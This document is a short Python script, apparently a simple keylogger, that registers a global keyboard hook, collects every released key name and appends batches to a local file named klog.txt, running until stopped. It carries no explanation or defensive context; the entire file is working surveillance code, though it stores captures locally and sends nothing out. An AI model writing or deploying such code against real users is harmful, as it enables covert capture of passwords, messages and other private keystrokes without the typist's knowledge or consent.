import keyboard
import os

texto = ""

def callback(event):
    global texto
    e = event.name

    if e is None:
        return

    texto += e if len(e) == 1 else f" {e}"

    if len(texto) > 30:
        base_dir = os.path.dirname(os.path.abspath(__file__))
        path = os.path.join(base_dir, "klog.txt")
        with open(path, "a", encoding="utf-8") as f:
            f.write(texto + "\n")
        texto = ""

keyboard.on_release(callback=callback)
keyboard.wait()